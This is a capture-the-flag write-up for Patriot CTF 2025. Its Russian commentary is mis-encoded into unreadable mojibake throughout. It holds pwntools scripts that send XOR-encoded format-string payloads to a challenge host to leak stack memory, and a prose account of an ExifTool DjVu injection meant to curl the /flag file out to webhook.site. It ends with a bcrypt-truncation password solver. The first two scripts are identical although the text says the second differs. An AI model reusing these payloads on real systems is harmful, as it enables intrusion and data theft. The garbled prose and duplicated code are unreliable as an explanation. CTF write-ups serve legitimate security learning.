[Patriot CTF 2025](https://pctf.competitivecyber.club)

![](img/7/1.png)

ÐŸÑ€Ð¾Ð±Ð¾Ð²Ð°Ð»Ð° Ñ€Ð°Ð·Ð½Ñ‹Ðµ Ð·Ð°Ð´Ð°Ñ‡Ð¸, Ð½Ð¸ Ð¾Ð´Ð½Ð° Ð½Ðµ Ð¿Ð¾Ð»ÑƒÑ‡Ð¸Ð»Ð°ÑÑŒ, Ð½Ð¸Ð¶Ðµ Ð½ÐµÐºÐ¾Ñ‚Ð¾Ñ€Ñ‹Ðµ Ð¸Ð· Ð¿Ð¾Ð¿Ñ‹Ñ‚Ð¾Ðº.

---

***Kittiez!!!!!***
---

![](img/7/2.png)

Ðš Ð·Ð°Ð´Ð°Ñ‡Ðµ Ð¿Ñ€Ð¸Ð»Ð¾Ð¶ÐµÐ½ Ñ„Ð°Ð¹Ð».

![](img/7/3.png)

ÐŸÑ€Ð¾Ð±Ð¾Ð²Ð°Ð»Ð° Ð¸ÑÐºÐ°Ñ‚ÑŒ Ð¸Ð·Ð¾Ð±Ñ€Ð°Ð¶ÐµÐ½Ð¸Ðµ Ð¿Ð¾ Ñ…ÑÑˆ-ÐºÐ¾Ð´Ñƒ Ð½Ð° Ð¼Ð½Ð¾Ð³Ð¸Ñ… ÑÐ°Ð¹Ñ‚Ð°Ñ…, Ð½Ð¸ Ð½Ð° Ð¾Ð´Ð½Ð¾Ð¼ Ð½Ðµ Ð¿Ñ€Ð¾ÑˆÐ»Ð¾, Ð½Ð¸Ð¶Ðµ Ð½ÐµÐºÐ¾Ñ‚Ð¾Ñ€Ñ‹Ðµ Ð¸Ð· Ð½ÐµÑƒÐ´Ð°Ñ‡Ð½Ñ‹Ñ… Ð¿Ð¾Ð¿Ñ‹Ñ‚Ð¾Ðº.

![](img/7/4.png)

![](img/7/5.png)

---

***cursed format***
---

![](img/7/6.png)

Ð”Ð»Ñ Ñ€ÐµÑˆÐµÐ½Ð¸Ñ Ð½Ð°Ð¿Ð¸ÑˆÐµÐ¼ ÑÐºÑ€Ð¸Ð¿Ñ‚, ÐºÐ¾Ñ‚Ð¾Ñ€Ñ‹Ð¹ Ð¼Ð½Ð¾Ð³Ð¾ÐºÑ€Ð°Ñ‚Ð½Ð¾ Ð¿Ð¾Ð´ÐºÐ»ÑŽÑ‡Ð°ÐµÑ‚ÑÑ Ðº ÑƒÐ´Ð°Ð»Ñ‘Ð½Ð½Ð¾Ð¼Ñƒ ÑÐµÑ€Ð²Ð¸ÑÑƒ, ÐºÐ°Ð¶Ð´Ñ‹Ð¹ Ñ€Ð°Ð· Ð´Ð¾Ð¶Ð¸Ð´Ð°ÐµÑ‚ÑÑ Ð¿Ð¾ÑÐ²Ð»ÐµÐ½Ð¸Ñ Ñ‚ÐµÐºÑÑ‚Ð¾Ð²Ð¾Ð³Ð¾ Ð¼ÐµÐ½ÑŽ, Ð²Ñ‹Ð±Ð¸Ñ€Ð°ÐµÑ‚ Ð¿ÐµÑ€Ð²Ñ‹Ð¹ Ð¿ÑƒÐ½ÐºÑ‚ Ð¸ Ð¾Ñ‚Ð¿Ñ€Ð°Ð²Ð»ÑÐµÑ‚ ÑÑ‚Ñ€Ð¾ÐºÑƒ Ñ„Ð¾Ñ€Ð¼Ð°Ñ‚Ð° Ð²Ð¸Ð´Ð° %N$sEND. Ð¢Ð°ÐºÐ¸Ð¼ Ð¾Ð±Ñ€Ð°Ð·Ð¾Ð¼ Ð¿Ñ€Ð¾Ð³Ñ€Ð°Ð¼Ð¼Ð° Ð¿Ð¾ Ð¾Ñ‡ÐµÑ€ÐµÐ´Ð¸ Â«Ð¿Ñ€Ð¾ÑÐ¸Ñ‚Â» ÑÐµÑ€Ð²ÐµÑ€ Ð²Ñ‹Ð²ÐµÑÑ‚Ð¸ Ñ€Ð°Ð·Ð½Ñ‹Ðµ Ð¿Ð°Ñ€Ð°Ð¼ÐµÑ‚Ñ€Ñ‹ Ð¸Ð· ÑÑ‚ÐµÐºÐ° ÐºÐ°Ðº ÑÑ‚Ñ€Ð¾ÐºÑƒ, Ð° Ð·Ð°Ñ‚ÐµÐ¼ ÑÑ‡Ð¸Ñ‚Ñ‹Ð²Ð°ÐµÑ‚ Ð²ÐµÑÑŒ Ð¾Ñ‚Ð²ÐµÑ‚ Ð¸ Ð¿Ñ€Ð¾Ð²ÐµÑ€ÑÐµÑ‚ ÐµÐ³Ð¾ Ð½Ð° Ð½Ð°Ð»Ð¸Ñ‡Ð¸Ðµ Ð¿Ð¾Ð´ÑÑ‚Ñ€Ð¾Ðº, Ð¿Ð¾Ñ…Ð¾Ð¶Ð¸Ñ… Ð½Ð° Ñ„Ð»Ð°Ð³. Ð•ÑÐ»Ð¸ Ð±Ñ‹ Ñ‚Ð°ÐºÐ°Ñ ÑÑ‚Ñ€Ð¾ÐºÐ° Ð²ÑÑ‚Ñ€ÐµÑ‚Ð¸Ð»Ð°ÑÑŒ, ÑÐºÑ€Ð¸Ð¿Ñ‚ Ð²Ñ‹Ð²ÐµÐ» Ð±Ñ‹ ÐµÑ‘ Ð¸ Ð¾ÑÑ‚Ð°Ð½Ð¾Ð²Ð¸Ð» Ð¿ÐµÑ€ÐµÐ±Ð¾Ñ€.

```python
from pwn import *

HOST = "18.212.136.134"
PORT = 8887

FMT_SIZE = 0x20

def encode(desired: bytes, key: bytes):
    desired = desired.ljust(FMT_SIZE, b"\x00")[:FMT_SIZE]
    encoded = bytes([desired[i] ^ key[i] for i in range(FMT_SIZE)])
    new_key = desired
    return encoded, new_key


for i in range(1, 25):
    print(f"[+] try %{i}$p")

    key = bytes([0xff] * FMT_SIZE)

    io = remote(HOST, PORT)

    io.recvuntil(b">> ")

    io.send(b"1".ljust(FMT_SIZE, b"\x00"))

    fmt = f"%{i}$p\n".encode()
    encoded, key = encode(fmt, key)
    io.send(encoded)

    data = io.recvuntil(b">> ", timeout=2)
    io.close()

    first_line = data.splitlines()[0]
    print(first_line.decode("latin-1", errors="ignore"))
    print()
```

ÐÐ¾, ÐºÐ°Ðº Ð²Ð¸Ð´Ð¸Ð¼, Ð² Ð²Ñ‹Ð²Ð¾Ð´Ðµ Ð¿Ñ€Ð¾Ð³Ñ€Ð°Ð¼Ð¼Ñ‹, Ñ‚Ð°ÐºÐ¾Ð¹ ÑÑ‚Ñ€Ð¾ÐºÐ¸ Ð½Ðµ Ð½Ð°ÑˆÐ»Ð¾ÑÑŒ.

![](img/7/7.png)

Ð¢Ð¾Ð³Ð´Ð° Ð½Ð°Ð¿Ð¸ÑˆÐµÐ¼ Ð´Ñ€ÑƒÐ³Ð¾Ð¹ ÑÐºÑ€Ð¸Ð¿Ñ‚, Ð¾Ð½ Ñ‚Ð°ÐºÐ¶Ðµ Ð¿Ð¾Ð´ÐºÐ»ÑŽÑ‡Ð°ÐµÑ‚ÑÑ Ðº ÑƒÐ´Ð°Ð»Ñ‘Ð½Ð½Ð¾Ð¼Ñƒ ÑÐµÑ€Ð²Ð¸ÑÑƒ, Ð½Ð¾ ÑƒÐ¶Ðµ ÑƒÑ‡Ð¸Ñ‚Ñ‹Ð²Ð°ÐµÑ‚ Ð¾ÑÐ¾Ð±ÐµÐ½Ð½Ð¾ÑÑ‚ÑŒ Ð·Ð°Ð´Ð°Ñ‡Ð¸: Ð¿ÐµÑ€ÐµÐ´ Ð¸ÑÐ¿Ð¾Ð»ÑŒÐ·Ð¾Ð²Ð°Ð½Ð¸ÐµÐ¼ ÑÑ‚Ñ€Ð¾ÐºÐ° Ð½Ð° ÑÐµÑ€Ð²ÐµÑ€Ðµ Ð¿Ð¾Ð±Ð°Ð¹Ñ‚Ð½Ð¾ ÑÐºÐ»Ð°Ð´Ñ‹Ð²Ð°ÐµÑ‚ÑÑ Ð¿Ð¾ XOR Ñ Ð½ÐµÐºÐ¾Ñ‚Ð¾Ñ€Ñ‹Ð¼ ÐºÐ»ÑŽÑ‡Ð¾Ð¼. 

```python
from pwn import *

HOST = "18.212.136.134"
PORT = 8887

FMT_SIZE = 0x20

def encode(desired: bytes, key: bytes):
    desired = desired.ljust(FMT_SIZE, b"\x00")[:FMT_SIZE]
    encoded = bytes([desired[i] ^ key[i] for i in range(FMT_SIZE)])
    new_key = desired
    return encoded, new_key


for i in range(1, 25):
    print(f"[+] try %{i}$p")

    key = bytes([0xff] * FMT_SIZE)

    io = remote(HOST, PORT)

    io.recvuntil(b">> ")

    io.send(b"1".ljust(FMT_SIZE, b"\x00"))

    fmt = f"%{i}$p\n".encode()
    encoded, key = encode(fmt, key)
    io.send(encoded)

    data = io.recvuntil(b">> ", timeout=2)
    io.close()

    first_line = data.splitlines()[0]
    print(first_line.decode("latin-1", errors="ignore"))
    print()
```

Ð¢Ð°ÐºÐ¸Ð¼ Ð¾Ð±Ñ€Ð°Ð·Ð¾Ð¼ ÑƒÐ´Ð°Ð»Ð¾ÑÑŒ Ð¿Ð¾Ð»ÑƒÑ‡Ð¸Ñ‚ÑŒ ÑƒÑ‚ÐµÑ‡ÐºÐ¸ Ð½ÐµÐºÐ¾Ñ‚Ð¾Ñ€Ñ‹Ñ… Ð°Ð´Ñ€ÐµÑÐ¾Ð² Ð¸Ð· ÑÑ‚ÐµÐºÐ° Ð¿Ñ€Ð¾Ñ†ÐµÑÑÐ°, Ð½Ð¾ ÑÑ€ÐµÐ´Ð¸ Ð½Ð¸Ñ… Ð½ÐµÑ‚ Ñ‡Ð¸Ñ‚Ð°ÐµÐ¼Ñ‹Ñ… ÑÑ‚Ñ€Ð¾Ðº Ð¸ Ð½ÐµÑ‚ Ñ„Ñ€Ð°Ð³Ð¼ÐµÐ½Ñ‚Ð¾Ð², Ð¿Ð¾Ñ…Ð¾Ð¶Ð¸Ñ… Ð½Ð° Ñ„Ð»Ð°Ð³. ÐŸÐ¾Ð»ÑƒÑ‡ÐµÐ½Ð½Ð¾Ð¹ Ð¸Ð½Ñ„Ð¾Ñ€Ð¼Ð°Ñ†Ð¸Ð¸ Ð¾ÐºÐ°Ð·Ð°Ð»Ð¾ÑÑŒ Ð½ÐµÐ´Ð¾ÑÑ‚Ð°Ñ‚Ð¾Ñ‡Ð½Ð¾, Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð¿Ð¾ Ð½ÐµÐ¹ Ð²Ð¾ÑÑÑ‚Ð°Ð½Ð¾Ð²Ð¸Ñ‚ÑŒ Ñ€Ð°ÑÐ¿Ð¾Ð»Ð¾Ð¶ÐµÐ½Ð¸Ðµ Ñ„Ð»Ð°Ð³Ð° Ð¸ ÑƒÑÐ¿ÐµÑˆÐ½Ð¾ Ð·Ð°Ð²ÐµÑ€ÑˆÐ¸Ñ‚ÑŒ Ð·Ð°Ð´Ð°Ð½Ð¸Ðµ.

![](img/7/8.png)

ÐŸÑ€Ð¾Ð±ÑƒÐµÐ¼ Ð´Ñ€ÑƒÐ³Ð¾Ð¹ ÑÐºÑ€Ð¸Ð¿Ñ‚, ÐºÐ¾Ñ‚Ð¾Ñ€Ñ‹Ð¹ ÐºÐ¾Ð¼Ð±Ð¸Ð½Ð¸Ñ€ÑƒÐµÑ‚ Ð¾Ð±Ð° Ð¿Ð¾Ð´Ñ…Ð¾Ð´Ð°: Ð¾Ð½ ÑƒÑ‡Ð¸Ñ‚Ñ‹Ð²Ð°ÐµÑ‚ Ð¿Ð¾Ð±Ð°Ð¹Ñ‚Ð¾Ð²Ð¾Ðµ ÑÐ»Ð¾Ð¶ÐµÐ½Ð¸Ðµ Ð¿Ð¾ XOR Ñ Ð¿Ð¾ÑÑ‚Ð¾ÑÐ½Ð½Ñ‹Ð¼ ÐºÐ»ÑŽÑ‡Ð¾Ð¼ 0xff Ð¸ Ð¿Ñ€Ð¸ ÑÑ‚Ð¾Ð¼ Ð¸ÑÐ¿Ð¾Ð»ÑŒÐ·ÑƒÐµÑ‚ ÑÐ¿ÐµÑ†Ð¸Ñ„Ð¸ÐºÐ°Ñ‚Ð¾Ñ€ Ñ„Ð¾Ñ€Ð¼Ð°Ñ‚Ð° %i$s, Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð¿Ð¾Ð¿Ñ‹Ñ‚Ð°Ñ‚ÑŒÑÑ Ð²Ñ‹Ð²ÐµÑÑ‚Ð¸ ÑÑ‚Ñ€Ð¾ÐºÐ¾Ð²Ñ‹Ðµ Ð´Ð°Ð½Ð½Ñ‹Ðµ Ð¸Ð· Ñ€Ð°Ð·Ð½Ñ‹Ñ… Ð¿Ð¾Ð·Ð¸Ñ†Ð¸Ð¹ Ð¿Ð°Ñ€Ð°Ð¼ÐµÑ‚Ñ€Ð¾Ð² Ñ„ÑƒÐ½ÐºÑ†Ð¸Ð¸.

```python
from pwn import *

HOST = "18.212.136.134"
PORT = 8887

FMT_SIZE = 0x20

def encode(desired: bytes) -> bytes:
    desired = desired.ljust(FMT_SIZE, b"\x00")[:FMT_SIZE]
    key = bytes([0xff] * FMT_SIZE)
    encoded = bytes([desired[i] ^ key[i] for i in range(FMT_SIZE)])
    return encoded

for i in range(1, 40):
    print(f"[+] try %{i}$s")

    io = remote(HOST, PORT)
    io.recvuntil(b">> ")

    io.send(b"1".ljust(FMT_SIZE, b"\x00"))

    fmt = f"%{i}$sEND\n".encode()
    payload = encode(fmt)
    io.send(payload)

    data = io.recvall(timeout=2)
    io.close()

    try:
        print(data.decode("latin-1", errors="ignore"))
    except:
        print(data)

    if b"pctf{" in data.lower():
        print("[+] POSSIBLE FLAG HERE ^^^")
        break
```

Ð’ Ð¾Ñ‚Ð²ÐµÑ‚Ð°Ñ… Ð½Ðµ Ð¿Ð¾ÑÐ²Ð»ÑÐµÑ‚ÑÑ Ð½Ð¸ Ð¾Ð´Ð½Ð¾Ð¹ Ð¿Ð¾Ð´ÑÑ‚Ñ€Ð¾ÐºÐ¸, Ð¿Ð¾Ñ…Ð¾Ð¶ÐµÐ¹ Ð½Ð° Ñ„Ð¾Ñ€Ð¼Ð°Ñ‚ Ñ„Ð»Ð°Ð³Ð°.

![](img/7/9.png)

---

***Reverse Metadata Part 1***
---

![](img/7/10.png)

Ð’Ð¸Ð´Ð¸Ð¼ Ð¿Ð¾Ð´ÑÐºÐ°Ð·ÐºÑƒ Ð¿Ñ€Ð¾ Exiftool Ð¸ Ð¿Ñ€Ð¾Ð±ÑƒÐµÐ¼ Ð²Ñ‹Ð·Ð²Ð°Ñ‚ÑŒ Ð¾ÑˆÐ¸Ð±ÐºÑƒ Ð² Ð¾Ð±Ñ€Ð°Ð±Ð¾Ñ‚ÐºÐµ Ð¼ÐµÑ‚Ð°Ð´Ð°Ð½Ð½Ñ‹Ñ… Ð¸Ð·Ð¾Ð±Ñ€Ð°Ð¶ÐµÐ½Ð¸Ñ. Ð”Ð»Ñ ÑÑ‚Ð¾Ð³Ð¾ ÑÐ¾Ð·Ð´Ð°ÐµÐ¼ Ñ‚ÐµÐºÑÑ‚Ð¾Ð²Ñ‹Ð¹ Ñ„Ð°Ð¹Ð» Ñ Ð¿Ð¾Ð»ÐµÐ¼ metadata, Ð² ÐºÐ¾Ñ‚Ð¾Ñ€Ð¾Ð¼ Ð²Ð¼ÐµÑÑ‚Ð¾ Ð¾Ð±Ñ‹Ñ‡Ð½Ñ‹Ñ… Ð´Ð°Ð½Ð½Ñ‹Ñ… Ð·Ð°Ð¿Ð¸ÑÑ‹Ð²Ð°ÐµÐ¼ ÐºÐ¾Ð¼Ð°Ð½Ð´Ñƒ id. Ð—Ð°Ñ‚ÐµÐ¼ ÑÑ‚Ð¾Ñ‚ Ñ‚ÐµÐºÑÑ‚ Ð¿Ñ€ÐµÐ¾Ð±Ñ€Ð°Ð·Ð¾Ð²Ñ‹Ð²Ð°ÐµÐ¼ Ð² ÑÐ¿ÐµÑ†Ð¸Ð°Ð»ÑŒÐ½Ñ‹Ð¹ Ð´Ð²Ð¾Ð¸Ñ‡Ð½Ñ‹Ð¹ Ð±Ð»Ð¾Ðº , ÑÐ¾Ð±Ñ€Ð¸Ñ€Ð°ÐµÐ¼ Ð¸Ð· Ð½ÐµÐ³Ð¾ Ñ„Ð°Ð¹Ð» Ñ„Ð¾Ñ€Ð¼Ð°Ñ‚Ð° DjVu Ð¸ Ð¼Ð°ÑÐºÐ¸Ñ€ÑƒÐµÐ¼ ÐµÐ³Ð¾ Ð¿Ð¾Ð´ ÐºÐ°Ñ€Ñ‚Ð¸Ð½ÐºÑƒ evil.jpg, Ð¿Ð¾ÑÐ»Ðµ Ñ‡ÐµÐ³Ð¾ ÑÑ‚Ð¾Ñ‚ Ñ„Ð°Ð¹Ð» Ð·Ð°Ð³Ñ€ÑƒÐ¶Ð°ÐµÐ¼ Ð½Ð° ÑÐ°Ð¹Ñ‚ Ð·Ð°Ð´Ð°Ð½Ð¸Ñ. ÐžÐ´Ð½Ð°ÐºÐ¾ Ð¿Ð¾ÑÐ»Ðµ Ð·Ð°Ð³Ñ€ÑƒÐ·ÐºÐ¸ Ð½Ð¸Ñ‡ÐµÐ³Ð¾ Ð½Ðµ Ð¿Ñ€Ð¾Ð¸Ð·Ð¾ÑˆÐ»Ð¾, ÑƒÑÐ·Ð²Ð¸Ð¼Ð¾ÑÑ‚ÑŒ Ð½Ðµ ÑÑ€Ð°Ð±Ð¾Ñ‚Ð°Ð»Ð°, Ð¸ Ð¿Ð¾Ð»ÑƒÑ‡Ð¸Ñ‚ÑŒ Ñ„Ð»Ð°Ð³ Ñ‚Ð°ÐºÐ¸Ð¼ ÑÐ¿Ð¾ÑÐ¾Ð±Ð¾Ð¼ Ð½Ðµ ÑƒÐ´Ð°Ð»Ð¾ÑÑŒ.

![](img/7/11.png)

Ð¢Ð¾Ð³Ð´Ð° Ð¿Ñ€Ð¾Ð±ÑƒÐµÐ¼ Ð¸Ð½Ð°Ñ‡Ðµ. Ð’ Ñ‚ÐµÐºÑÑ‚Ð¾Ð²Ñ‹Ð¹ Ñ„Ð°Ð¹Ð» payload Ð·Ð°Ð¿Ð¸ÑˆÐµÐ¼ ÑÐ¿ÐµÑ†Ð¸Ð°Ð»ÑŒÐ½Ð¾Ðµ Ð¿Ð¾Ð»Ðµ metadata, Ð²Ð½ÑƒÑ‚Ñ€Ð¸ ÐºÐ¾Ñ‚Ð¾Ñ€Ð¾Ð³Ð¾ Ð²Ð¼ÐµÑÑ‚Ð¾ Ð¾Ð±Ñ‹Ñ‡Ð½Ñ‹Ñ… Ð´Ð°Ð½Ð½Ñ‹Ñ… ÐºÐ¾Ð¼Ð°Ð½Ð´Ð° Ð¾Ð±Ð¾Ð»Ð¾Ñ‡ÐºÐ¸: Ð·Ð°Ð¿ÑƒÑÑ‚Ð¸Ñ‚ÑŒ curl Ð½Ð° Ð°Ð´Ñ€ÐµÑ ÑÐµÑ€Ð²Ð¸ÑÐ° webhook.site Ð¸ Ð² Ð·Ð°Ð¿Ñ€Ð¾ÑÐµ Ð¿ÐµÑ€ÐµÐ´Ð°Ñ‚ÑŒ ÑÐ¾Ð´ÐµÑ€Ð¶Ð¸Ð¼Ð¾Ðµ Ñ„Ð°Ð¹Ð»Ð° /flag. Ð—Ð°Ñ‚ÐµÐ¼ ÑÑ‚Ð¾Ñ‚ Ñ‚ÐµÐºÑÑ‚ ÑÐ½Ð¾Ð²Ð° ÑƒÐ¿Ð°ÐºÐ¾Ð²Ñ‹Ð²Ð°ÐµÐ¼ Ð² DjVu-Ñ„Ð°Ð¹Ð» Ð¸ Ð·Ð°Ð³Ñ€ÑƒÐ¶Ð°ÐµÐ¼ Ð½Ð° ÑÐµÑ€Ð²ÐµÑ€ Ð·Ð°Ð´Ð°Ð½Ð¸Ñ. ÐŸÑ€Ð¾Ð²ÐµÑ€ÐºÐ° Ð»Ð¾ÐºÐ°Ð»ÑŒÐ½Ð¾ Ð¿Ð¾ÐºÐ°Ð·Ð°Ð»Ð°, Ñ‡Ñ‚Ð¾ Ð·Ð°Ð¿Ñ€Ð¾Ñ Ð½Ð° webhook Ð´ÐµÐ¹ÑÑ‚Ð²Ð¸Ñ‚ÐµÐ»ÑŒÐ½Ð¾ Ð¿Ñ€Ð¸Ñ…Ð¾Ð´Ð¸Ñ‚, Ð½Ð¾ Ð¿Ð¾ÑÐ»Ðµ Ð·Ð°Ð³Ñ€ÑƒÐ·ÐºÐ¸ Ñ„Ð°Ð¹Ð»Ð° Ð² Ð²ÐµÐ±-Ñ„Ð¾Ñ€Ð¼Ñƒ Ð½Ð¸ÐºÐ°ÐºÐ¸Ñ… Ð½Ð¾Ð²Ñ‹Ñ… Ð·Ð°Ð¿Ñ€Ð¾ÑÐ¾Ð² Ð½Ð° webhook Ð½Ðµ Ð¿Ð¾ÑÐ²Ð¸Ð»Ð¾ÑÑŒ, Ñ‚Ð¾ ÐµÑÑ‚ÑŒ ÐºÐ¾Ð¼Ð°Ð½Ð´Ð° Ð½Ð° ÑƒÐ´Ð°Ð»Ñ‘Ð½Ð½Ð¾Ð¼ ÑÐµÑ€Ð²ÐµÑ€Ðµ Ñ„Ð°ÐºÑ‚Ð¸Ñ‡ÐµÑÐºÐ¸ Ð½Ðµ Ð·Ð°Ð¿ÑƒÑÐºÐ°ÐµÑ‚ÑÑ. Ð’ Ð¸Ñ‚Ð¾Ð³Ðµ Ð¿Ð¾Ð»ÑƒÑ‡Ð¸Ñ‚ÑŒ Ñ„Ð»Ð°Ð³ Ñ‚Ð°ÐºÐ¸Ð¼ ÑÐ¿Ð¾ÑÐ¾Ð±Ð¾Ð¼ Ñ‚Ð°Ðº Ð¸ Ð½Ðµ ÑƒÐ´Ð°Ð»Ð¾ÑÑŒ.

![](img/7/12.png)

---

***Vibe Bank Vault***
---

![](img/7/13.png)

Ð”Ð»Ñ Ñ€ÐµÑˆÐµÐ½Ð¸Ñ Ð·Ð°Ð´Ð°Ð½Ð¸Ñ Ð½Ð°Ð¿Ð¸ÑˆÐµÐ¼ ÑÐºÑ€Ð¸Ð¿Ñ‚, ÐºÐ¾Ñ‚Ð¾Ñ€Ñ‹Ð¹ Ð°Ð²Ñ‚Ð¾Ð¼Ð°Ñ‚Ð¸Ñ‡ÐµÑÐºÐ¸ Ð¿Ñ€Ð¾Ñ…Ð¾Ð´Ð¸Ñ‚ Ð²ÑÐµ Ð¿ÑÑ‚ÑŒ ÑƒÑ€Ð¾Ð²Ð½ÐµÐ¹ Â«Ð±Ð°Ð½ÐºÐ¾Ð²ÑÐºÐ¾Ð³Ð¾ Ñ…Ñ€Ð°Ð½Ð¸Ð»Ð¸Ñ‰Ð°Â». ÐžÐ½ Ð²Ð¾ÑÐ¿Ñ€Ð¾Ð¸Ð·Ð²Ð¾Ð´Ð¸Ñ‚ Ð½Ð° ÑÐ²Ð¾ÐµÐ¹ ÑÑ‚Ð¾Ñ€Ð¾Ð½Ðµ ÑÐ¿ÐµÑ†Ð¸Ð°Ð»ÑŒÐ½Ñ‹Ð¹ Ñ…ÐµÑˆ Ð½Ð° Ð¾ÑÐ½Ð¾Ð²Ðµ bcrypt Ð¸ Ð·Ð°Ð´Ð°Ð½Ð½Ð¾Ð¹ ÑÐ¾Ð»Ð¸, Ð¿Ð¾ ÑƒÑ‚Ñ‘ÐºÑˆÐµÐ¹ Ñ‡Ð°ÑÑ‚Ð¸ Ð¿Ð°Ñ€Ð¾Ð»Ñ Ð¿Ð¾Ð´Ð±Ð¸Ñ€Ð°ÐµÑ‚ Ð½ÐµÐ´Ð¾ÑÑ‚Ð°ÑŽÑ‰Ð¸Ðµ ÑÐ¸Ð¼Ð²Ð¾Ð»Ñ‹, Ð·Ð°Ñ‚ÐµÐ¼ Ð¿Ð¾ Ð¾Ñ‡ÐµÑ€ÐµÐ´Ð¸ Ð²Ñ‹Ð¿Ð¾Ð»Ð½ÑÐµÑ‚ ÑƒÑÐ»Ð¾Ð²Ð¸Ñ ÑƒÑ€Ð¾Ð²Ð½ÐµÐ¹: ÑÐ¾Ð·Ð´Ð°ÐµÑ‚ ÑÑ‚Ñ€Ð¾ÐºÐ¸ Ñ Ð¾Ð´Ð¸Ð½Ð°ÐºÐ¾Ð²Ñ‹Ð¼ Ñ…ÐµÑˆÐµÐ¼, Ð¿Ð¾Ð´Ð±Ð¸Ñ€Ð°ÐµÑ‚ Ð±Ð¾Ð»ÐµÐµ ÐºÐ¾Ñ€Ð¾Ñ‚ÐºÐ¸Ð¹ ÑÐºÐ²Ð¸Ð²Ð°Ð»ÐµÐ½Ñ‚ Ð¿Ð°Ñ€Ð¾Ð»Ñ Ð½ÑƒÐ¶Ð½Ð¾Ð¹ Ð´Ð»Ð¸Ð½Ñ‹, ÑƒÐ¿Ñ€Ð¾Ñ‰Ð°ÐµÑ‚ Ð´Ð»Ð¸Ð½Ð½Ñ‹Ð¹ Ð¿Ð°Ñ€Ð¾Ð»ÑŒ Ñ Ð¿Ð¾Ð²Ñ‚Ð¾Ñ€ÑÑŽÑ‰Ð¸Ð¼Ð¸ÑÑ ÑÐ¸Ð¼Ð²Ð¾Ð»Ð°Ð¼Ð¸ Ð´Ð¾ 72 Ð±Ð°Ð¹Ñ‚ Ð¸ Ð² ÐºÐ¾Ð½Ñ†Ðµ Ð¿Ð¾Ð²Ñ‚Ð¾Ñ€Ð½Ð¾ Ð¸ÑÐ¿Ð¾Ð»ÑŒÐ·ÑƒÐµÑ‚ Ð½Ð°Ð¹Ð´ÐµÐ½Ð½Ñ‹Ð¹ Ð¿Ñ€ÐµÑ„Ð¸ÐºÑ Ð´Ð»Ñ Ð´Ð¾ÑÑ‚ÑƒÐ¿Ð° Ð½Ð° Ð°Ð´Ð¼Ð¸Ð½Ð¸ÑÑ‚Ñ€Ð°Ñ‚Ð¸Ð²Ð½Ñ‹Ð¹ ÑƒÑ€Ð¾Ð²ÐµÐ½ÑŒ.

```python
from pwn import *
import re
import base64
import bcrypt
import string

HOST = "18.212.136.134"
PORT = 6666

STATIC_SALT = b"$2b$12$C8YQMlqDyz3vGN9VOGBeGu"

def vibe_hash_local(s: str) -> str:
    payload = s.encode("utf-8")
    portion = payload[: len(payload) % 256]
    digest = bcrypt.hashpw(portion, STATIC_SALT)
    return "vb$1$" + base64.b64encode(digest).decode()

def solve_one():
    r = remote(HOST, PORT)

    r.recvuntil(b"Leaked Note:")
    leaked_part = r.recvline().decode().strip()
    r.recvuntil(b"Target Hash:")
    target_hash = r.recvline().decode().strip()
    r.recvuntil(b"Enter password")

    log.info(f"Leaked first part: {leaked_part}")
    log.info(f"Target hash: {target_hash}")

    charset = string.ascii_letters + string.digits
    prefix72 = None
    for c1 in charset:
        for c2 in charset:
            cand = leaked_part + c1 + c2
            if vibe_hash_local(cand) == target_hash:
                prefix72 = cand
                log.success(f"[L1] Found prefix72 = {prefix72}")
                break
        if prefix72:
            break
    if not prefix72:
        log.failure("Cannot find prefix72")
        r.close()
        return

    r.sendline(prefix72.encode())

    r.recvuntil(b"I'll give you a prefix:")
    line = r.recvline().decode()
    m = re.search(r"prefix:\s*'([^']+)'", line)
    prefix = m.group(1)
    log.info(f"[L2] Prefix = {prefix}")
    r.recvuntil(b"Format:")

    plen = len(prefix)
    s1 = prefix + "A" * (256 - plen)
    s2 = prefix + "B" * (512 - plen)
    r.sendline(f"{s1},{s2}".encode())
    log.success("[L2] Collision sent")

    r.recvuntil(b"The manager's password is very long")
    line = r.recvline().decode()
    m = re.search(r"very long \((\d+)", line)
    target_len = int(m.group(1))
    log.info(f"[L3] target_len = {target_len}")
    r.recvuntil(b"Enter the equivalent password")

    R = target_len % 256
    user3 = "B" * R
    r.sendline(user3.encode())
    log.success("[L3] Short B^R password sent")

    r.recvuntil(b"The target password is:")
    line = r.recvline().decode()
    m = re.search(r"password is:\s*(\d+)\s*'C's\s*\+\s*(\d+)\s*'ðŸ”¥'", line)
    pad_len = int(m.group(1))
    emoji_count = int(m.group(2))
    log.info(f"[L4] pad_len={pad_len}, emoji_count={emoji_count}")
    r.recvuntil(b"Enter password")

    k = (72 - pad_len) // 4
    cand4 = "C" * pad_len + "ðŸ”¥" * k
    assert len(cand4.encode()) <= 72
    r.sendline(cand4.encode())
    log.success("[L4] Truncated C+ðŸ”¥ password sent")

    r.recvuntil(b"SecretPassword:")
    line = r.recvline().decode()
    m = re.search(r"SecretPassword:\s*(\d+)", line)
    admin_len = int(m.group(1))
    log.info(f"[L5] admin_len = {admin_len}")
    r.recvuntil(b"Input your password")

    r.sendline(prefix72.encode())
    log.success("[L5] Sent prefix72 for aux token")

    out = r.recvall(timeout=2).decode(errors="ignore")
    print(out)
    r.close()

if __name__ == "__main__":
    solve_one()
```

